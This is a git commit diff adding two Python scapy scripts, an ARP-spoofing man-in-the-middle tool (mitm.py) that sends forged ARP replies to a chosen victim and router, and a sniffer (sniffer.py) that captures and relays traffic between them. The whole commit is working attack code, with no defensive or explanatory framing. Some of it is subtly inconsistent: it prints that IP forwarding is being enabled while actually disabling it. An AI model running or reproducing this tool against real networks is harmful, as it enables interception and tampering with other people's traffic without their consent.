1b7e2f9eb2d025f2c491c222f74de46b2656854c
root <root@localhost.localdomain>
2018-03-09 15:11:48 -0500

    added spoofer and sniffer

---
+++ main/mitm.py
@@ -0,0 +1,78 @@
+from scapy.all import *
+import sys, os, time
+
+def get_mac(IP):
+	conf.verb = 0
+	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
+	for snd, rcv in ans:
+		return rcv.sprintf(r"%Ether.src%")
+	#endfor
+#enddef
+
+def reARP():
+	print "\n[*] Restoring Targets..."
+	victimMAC = get_mac(victimIP)
+	gateMAC = get_mac(gateIP)
+	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+	print "[*] Disabling IP Forwarding..."
+	forward_ip(0)
+	print "[*] Shutting Down..."
+	sys.exit(1)
+#enddef
+
+def trick(gm, vm):
+	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
+	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))
+#enddef
+
+def forward_ip(i):
+	os.system("echo " + str(i) + " > /proc/sys/net/ipv4/ip_forward")
+#enddef
+
+def mitm():
+	try:
+		victimMAC = get_mac(victimIP)
+	except Exception:
+		forward_ip(0)
+		print "[!] Couldn't Find Victim MAC Address"
+		print "[!] Exiting..."
+		sys.exit(1)
+	#endtry
+	try:
+		gateMAC = get_mac(gateIP)
+	except Exception:
+		forward_ip(0)
+		print "[!] Couldn't Find Gateway MAC Address"
+		print "[!] Exiting..."
+		sys.exit(1)
+	#endtry
+
+	print "[*] Poisoning Targets..."
+
+	while 1:
+		try:
+			trick(gateMAC, victimMAC)
+			time.sleep(1.5)
+		except KeyboardInterrupt:
+			reARP()
+			break
+		#endtry
+	#endwhile
+#enddef
+
+if __name__ == '__main__':
+	try:
+		interface = raw_input("[*] Enter Desired Interface: ")
+		victimIP = raw_input("[*] Enter Victim IP: ")
+		gateIP = raw_input("[*] Enter Router IP: ")
+	except KeyboardInterrupt:
+		print "\n[*] User Requested Shutdown"
+		print "[*] Exiting..."
+		sys.exit(1)
+	#endtry
+	
+	print "\n[*] Enabling IP Forwarding...\n"
+
+	forward_ip(0)
+	mitm()
---
+++ main/sniffer.py
@@ -0,0 +1,59 @@
+from scapy.all import *
+import sys, os, time
+
+def get_mac(IP):
+	conf.verb = 0
+	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
+	for snd, rcv in ans:
+		return rcv.sprintf(r"%Ether.src%")
+	#endfor
+#def
+
+def send_pkt (packet):
+	if len(packet) > 1500:
+		frags = fragment(packet,fragsize=500)
+		for frag in frags:
+			s.send(frag)
+		#endfor
+	else:
+		s.send(packet)
+	#endif
+#enddef
+
+def forward(packet):
+	myMAC = packet[Ether].dst
+	packet[Ether].dst = EX.get(packet[Ether].src)
+	packet[Ether].src = myMAC
+	send_pkt(packet)
+#enddef
+
+if __name__ == '__main__':
+	try:
+		interface = raw_input("[*] Enter Desired Interface: ")
+		victimIP = raw_input("[*] Enter Victim IP: ")
+		gateIP = raw_input("[*] Enter Router IP: ")
+	except KeyboardInterrupt:
+		print "\n[*] User Requested Shutdown"
+		print "[*] Exiting..."
+		sys.exit(1)
+	#endtry
+	try:
+		victimMAC = get_mac(victimIP)
+	except Exception:
+		print "[!] Sniffer: Couldn't Find Victim MAC Address"
+		print "[!] Sniffer: Exiting..."
+		sys.exit(1)
+	#endtry
+
+	try:
+		gateMAC = get_mac(gateIP)
+	except Exception:
+		print "[!] Sniffer: Couldn't Find Gateway MAC Address"
+		print "[!] Sniffer: Exiting..."
+		sys.exit(1)
+	#endtry
+
+	EX = {gateMAC: victimMAC, victimMAC: gateMAC}
+	s = conf.L2socket(iface=interface)
+	print "\n[*] Begin sniffing...\n"
+	sniff(filter="ether src %s or ether src %s" % (victimMAC, gateMAC), prn=forward)
